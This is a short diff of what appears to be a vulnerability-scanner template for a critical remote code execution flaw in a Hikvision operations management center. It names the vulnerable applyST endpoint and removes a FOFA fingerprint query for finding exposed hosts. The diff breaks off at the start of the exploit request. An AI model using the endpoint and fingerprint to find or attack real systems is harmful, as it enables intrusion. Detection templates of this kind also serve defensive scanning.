@@ -3,12 +3,8 @@ info:
   name: 海康威视运行管理中心applyST远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gm1xt5fi9e823euy'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gm1xt5fi9e823euy
-    fofa: 'header="X-Content-Type-Options: nosniff" && body="<h1>Welcome to OpenResty!</h1>" && header="X-Xss-Protection: 1; mode=block"'
 http:
 - raw:
   - 'POST /bic/ssoService/v1/applyST HTTP/1.1
